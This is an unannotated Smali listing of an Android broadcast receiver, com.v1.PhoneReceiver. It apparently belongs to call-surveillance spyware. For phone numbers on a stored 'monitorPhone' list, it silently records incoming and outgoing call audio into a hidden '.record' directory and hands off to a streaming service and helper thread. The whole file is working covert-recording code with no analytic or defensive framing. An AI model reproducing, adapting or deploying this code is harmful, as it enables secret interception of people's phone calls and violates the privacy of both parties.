.class public Lcom/v1/PhoneReceiver;
.super Landroid/content/BroadcastReceiver;


# static fields
.field private static b:Z

.field private static c:Ljava/lang/String;

.field private static d:Landroid/media/MediaRecorder;

.field private static e:Z

.field private static final f:Ljava/lang/String;


# instance fields
.field private a:Landroid/content/SharedPreferences;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v1, 0x0

    sput-boolean v1, Lcom/v1/PhoneReceiver;->b:Z

    const/4 v0, 0x0

    sput-object v0, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    sput-boolean v1, Lcom/v1/PhoneReceiver;->e:Z

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/v1/PhoneReceiver;->f:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/v1/PhoneReceiver;->a:Landroid/content/SharedPreferences;

    return-void
.end method

.method static synthetic a()Landroid/media/MediaRecorder;
    .locals 1

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method private a(Ljava/lang/String;)Z
    .locals 5

    const/4 v1, 0x0

    iget-object v0, p0, Lcom/v1/PhoneReceiver;->a:Landroid/content/SharedPreferences;

    const-string v2, "monitorPhone"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    :cond_0
    :goto_0
    return v1

    :cond_1
    const-string v2, ","

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    move v0, v1

    :goto_1
    array-length v3, v2

    if-ge v0, v3, :cond_0

    aget-object v3, v2, v0

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_2

    aget-object v3, v2, v0

    invoke-virtual {p1, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    if-ltz v3, :cond_2

    const/4 v1, 0x1

    goto :goto_0

    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_1
.end method

.method static synthetic b()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    const/4 v6, 0x0

    const/4 v5, 0x0

    const/4 v2, 0x1

    const-string v0, "monitorPhone"

    invoke-virtual {p1, v0, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lcom/v1/PhoneReceiver;->a:Landroid/content/SharedPreferences;

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sput-boolean v2, Lcom/v1/PhoneReceiver;->e:Z

    sput-boolean v5, Lcom/v1/PhoneReceiver;->b:Z

    const-string v0, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    sget-object v0, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    invoke-direct {p0, v0}, Lcom/v1/PhoneReceiver;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sput-boolean v2, Lcom/v1/PhoneReceiver;->b:Z

    :cond_0
    sget-boolean v0, Lcom/v1/PhoneReceiver;->b:Z

    if-eqz v0, :cond_2

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    :cond_1
    sget-boolean v0, Lcom/v1/StreamService;->e:Z

    if-nez v0, :cond_2

    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "out_"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "_"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyyMMdd_HHmmss"

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v2, v3, v4}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    const-string v2, "/data/data/com.v1/.record/"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    sget-object v1, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "/data/data/com.v1/.record/"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ".amr"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    :try_start_0
    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/v1/StreamService;->e:Z

    new-instance v0, Lcom/v1/d;

    invoke-direct {v0, p0, p1}, Lcom/v1/d;-><init>(Lcom/v1/PhoneReceiver;Landroid/content/Context;)V

    invoke-virtual {v0}, Lcom/v1/d;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    :goto_0
    return-void

    :catch_0
    move-exception v0

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    goto :goto_0

    :cond_3
    const-string v0, "phone"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getCallState()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    goto :goto_0

    :pswitch_0
    sget-boolean v0, Lcom/v1/PhoneReceiver;->b:Z

    if-eqz v0, :cond_2

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_2

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    goto :goto_0

    :pswitch_1
    sput-boolean v5, Lcom/v1/PhoneReceiver;->e:Z

    const-string v0, "incoming_number"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    sget-object v0, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    invoke-direct {p0, v0}, Lcom/v1/PhoneReceiver;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    sput-boolean v2, Lcom/v1/PhoneReceiver;->b:Z

    goto :goto_0

    :cond_4
    sput-boolean v5, Lcom/v1/PhoneReceiver;->b:Z

    goto :goto_0

    :pswitch_2
    sget-boolean v0, Lcom/v1/PhoneReceiver;->e:Z

    if-nez v0, :cond_2

    sget-boolean v0, Lcom/v1/PhoneReceiver;->b:Z

    if-eqz v0, :cond_2

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_5

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    :cond_5
    sget-boolean v0, Lcom/v1/StreamService;->e:Z

    if-nez v0, :cond_2

    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "in_"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/v1/PhoneReceiver;->c:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "_"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "yyyyMMdd_HHmmss"

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v2, v3, v4}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    const-string v2, "/data/data/com.v1/.record/"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    sget-object v1, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "/data/data/com.v1/.record/"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ".amr"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    :try_start_1
    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/v1/StreamService;->e:Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v0

    sput-boolean v5, Lcom/v1/StreamService;->e:Z

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sput-object v6, Lcom/v1/PhoneReceiver;->d:Landroid/media/MediaRecorder;

    goto/16 :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method
